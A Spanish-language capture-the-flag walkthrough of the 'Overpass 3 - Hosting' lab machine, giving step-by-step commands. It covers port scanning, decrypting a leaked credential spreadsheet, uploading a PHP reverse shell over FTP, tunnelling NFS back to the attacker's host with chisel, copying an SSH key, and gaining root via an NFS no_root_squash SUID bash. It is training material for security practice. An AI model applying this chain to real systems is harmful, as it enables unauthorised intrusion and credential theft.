# Overpass 3 - Hosting
Comenzamos realizando un escaneo de puertos en la máquina objetivo.

```bash
nmap -sV -sC -p- -T4 <ip>
```

* -sV: Sondeo de puertos abiertos para determinar la información del servicio/versión
* -sC: equivalente a _--script=default_.
* -p-: Escanea todos los puertos de la Red (65536)
* -T4: La velocidad de escaneo de puertos.

Se han identificado dos puertos abiertos en el sistema: el puerto `22` para `ssh`, el `21` para `FTP` y el `80`, para `HTTP`.

<figure><img src="../.gitbook/assets/OverPass3/Nmaps.png" alt=""><figcaption></figcaption></figure>

Enumeramos los directorios en la página web.

Encontramos un directorio llamado `/backups`, lo descargamos y lo descomprimimos utilizando el siguiente comando.

<figure><img src="../.gitbook/assets/OverPass3/backups.png" alt=""><figcaption></figcaption></figure>

```
unzip backup.zip
```

<figure><img src="../.gitbook/assets/OverPass3/uinzip.png" alt=""><figcaption></figcaption></figure>

Al revisar, encontramos dos archivos `gpg`: uno es el archivo protegido `CustomerDetails.xlsx.gpg` y el otro, `priv.key`, es la clave que necesitamos para desencriptarlo. 

Procedemos a importar la clave.

```
gpg --import priv.key
```

Y Desencriptamos el archivo.

```
gpg CustomerDetails.xlsx.gpg
```

<figure><img src="../.gitbook/assets/OverPass3/import gpg.png" alt=""><figcaption></figcaption></figure>

Finalmente, abrimos el archivo que nos proporciona y podemos ver las credenciales de acceso.

<figure><img src="../.gitbook/assets/OverPass3/creeds.png" alt=""><figcaption></figcaption></figure>

Con estas credenciales, podemos acceder al servidor `FTP` utilizando el usuario `paradox`.

<figure><img src="../.gitbook/assets/OverPass3/ftp.png" alt=""><figcaption></figcaption></figure>

Podemos cargar un archivo que contenga nuestra `rev-shell` en formato `PHP`, así que creamos nuestro archivo shell.php.

{% embed url="https://www.revshells.com/" %}

```
nano shell.php
```

Lo subimos al servidor `ftp` .

```
put shell.php
```

<figure><img src="../.gitbook/assets/OverPass3/shellphp.png" alt=""><figcaption></figcaption></figure>

Realizamos una solicitud a nuestro archivo a través del navegador, lo que nos permite obtener una `shell` de `Apache`.


<figure><img src="../.gitbook/assets/OverPass3/shellapache.png" alt=""><figcaption></figcaption></figure>

# \apache

Una vez que accedemos al servidor, encontramos el archivo que nos solicita `web.flag` en `/usr/share/httpd`.

<figure><img src="../.gitbook/assets/OverPass3/webflag.png" alt=""><figcaption></figcaption></figure>

Para elevar nuestros privilegios, podemos ejecutar `su paradox` e ingresar con la contraseña que teníamos anteriormente del archivo `Excel`, lo que nos permitirá acceder al usuario.

<figure><img src="../.gitbook/assets/OverPass3/paradox.png" alt=""><figcaption></figcaption></figure>

# \paradox

En la enumeración con `pspy64`, no encontramos nada anormal, ya que solo había procesos normales. Sin embargo, al utilizar `linpeas.sh`, nos damos cuenta de que hay un vector de ataque que podemos explotar.

```
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

<figure><img src="../.gitbook/assets/OverPass3/no_rrot-nfs.png" alt=""><figcaption></figcaption></figure>

Sin embargo, al intentar enumerar el servicio, no podemos hacerlo.

<figure><img src="../.gitbook/assets/OverPass3/mount.png" alt=""><figcaption></figcaption></figure>

Esto indica que está dentro del servidor, así que revisamos las conexiones de la tarjeta de red.

<figure><img src="../.gitbook/assets/OverPass3/ports.png" alt=""><figcaption></figcaption></figure>

Aquí descubrimos que hay al menos seis puertos que podemos enumerar dentro de la máquina. Como no contamos con el comando, debemos tunelizar las solicitudes para redirigirlas a nuestra máquina. Utilizaremos `chisel` para lograrlo.

Local:
```
chisel server --reverse --port 9001
```

Victima:

```
./chisel client 10.*.*.**:9001 R:2049:127.0.0.1:2049
```

Ahora solo nos queda conectarnos y montar la conexión en una carpeta. Para ello, podemos utilizar el siguiente comando:

```
sudo mount -t nfs localhost:/ /mnt
```

Con esto, podemos acceder a nuestro segundo archivo, `user.flag`.

<figure><img src="../.gitbook/assets/OverPass3/flaguser.png" alt=""><figcaption></figcaption></figure>

# \james

Para acceder como `james`, solo necesitamos copiar el archivo `id_rsa` del directorio `.ssh`.

<figure><img src="../.gitbook/assets/OverPass3/sshhjames.png" alt=""><figcaption></figcaption></figure>

Accedemos utilizando el siguiente comando:

```
ssh -i id_rsa james@<ip>
```

Con esto, solo nos queda acceder como `root`. Para lograrlo, desde nuestra máquina, seguimos estos pasos.

Desde la maquina objetivo:

```
cp /bin/bash
```

Desde la maquina atacante:

```
sudo su
```

```
chown root:root bash
```

```
chmod +s bash
```

<figure><img src="../.gitbook/assets/OverPass3/sudisu.png" alt=""><figcaption></figcaption></figure>

Finalmente, desde la máquina objetivo, podemos obtener permisos de `root` con el siguiente comando y acceder a nuestro último archivo.
```
./bash -p
```

<figure><img src="../.gitbook/assets/OverPass3/root.png" alt=""><figcaption></figcaption></figure>

----------
>
>Pero Señor, dime: ¿Qué he hecho mal, que paso conmigo al final? ¿Qué estoy dejando ir? ¿Por qué siento este vacío, esta nostalgia? ¿Qué es esta ansiedad? Es como si amara algo que aún no conozco.
>
><figure><img src="../.gitbook/assets/OverPass3/touhou.png" alt=""><figcaption></figcaption></figure>